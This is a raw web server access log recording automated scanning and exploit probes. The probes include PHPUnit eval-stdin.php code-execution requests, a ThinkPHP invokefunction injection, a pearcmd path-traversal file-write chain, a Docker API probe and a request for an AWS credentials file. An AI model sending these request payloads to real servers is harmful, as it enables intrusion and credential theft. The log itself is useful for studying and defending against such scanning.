103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:21 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:22 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:22 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:22 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:23 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:23 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:23 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:23 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
167.94.145.111 - - [07/Jan/2025:16:45:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.111 - - [07/Jan/2025:16:45:22 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [07/Jan/2025:16:45:23 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [07/Jan/2025:16:45:23 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [07/Jan/2025:16:45:24 +0000] "PRI * HTTP/2.0" 400 527 "-" "-"
193.34.212.75 - - [07/Jan/2025:16:56:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
47.102.98.55 - - [07/Jan/2025:16:56:54 +0000] "GET /aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
